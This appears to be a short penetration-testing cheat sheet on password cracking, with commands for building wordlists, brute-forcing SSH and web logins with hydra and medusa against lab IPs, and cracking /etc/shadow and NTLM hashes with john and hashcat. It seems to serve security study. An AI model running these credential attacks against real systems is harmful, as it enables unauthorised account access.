# password cracking

## references

<http://gchq.github.io/CyberChef/>
<http://openwall.info/wiki/john/sample-hashes>

## directory

```bash
/usr/share/wordlists/
/usr/share/seclist/

cewl www.megacorpone.com -m 6 -w megacorpone-cewl.txt
john --wordlist=megacorpone-cewl.txt --rules --stdout > megacorpone-john.txt

crunch 6 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o crunch.txt
```

## online

### medusa

```bash
medusa -d
medusa -M http -q

medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin -T 10

```

### hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.11.12.10

hydra 10.1.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid Password!" -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http-post-form.txt
```

## offline

### john

```bash
unshadow /etc/passwd /etc/shadow > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### hashcat

```bash
hashcat --help | grep -i ntlm
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
